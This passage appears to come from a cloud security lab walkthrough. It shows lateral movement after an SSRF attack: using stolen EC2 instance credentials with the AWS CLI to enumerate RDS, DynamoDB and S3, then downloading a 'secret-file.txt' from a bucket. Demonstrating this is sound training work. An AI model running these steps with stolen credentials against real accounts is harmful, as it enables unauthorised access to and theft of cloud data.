## Lateral movement

1.  First, check that the profile has been configured correctly by executing a get-caller-identity API call.

```script
    aws sts get-caller-identity --profile ssrf-demo
```

<br/>
<br/>
2.  Now that we have live credentials of the ec2 instance, we can begin our reconaissance looking for what else might be in the account.

Remembering our goal is to exfiltrate data, let's see whether we can find any data stores that this ec2 instance might have access to.

```script
    aws rds describe-db-instances --profile ssrf-demo

    aws dynamodb list-tables --profile ssrf-demo
    
    aws s3 ls --profile ssrf-demo
```

The first two calls didn't work, but it seems that this role has the ability to list buckets.  Let's see keep going down this track, and see whether we can find anything further in these buckets.  This process is called `enumeration`. 

<br/>
<br/>
3.  Enumerate all the buckets

Run the below command, substituting `{bucket_name}` for the name of the ec2-metadata bucket returned in the previous step.

```script
    aws s3 ls {bucket_name} --profile ssrf-demo
```

There's another object in here, our `secret-file.txt`.  As an attacker, we might want to download this file.  This is called `exfiltration`. 

<br/>
<br/>
4.  Exfiltrate the data!

Let's download the file locally. 

```script
    aws s3 cp s3://{bucket_name}/secret-file.txt . --profile ssrf-demo
```

Congratulations, you have just achieved your malicious objective! 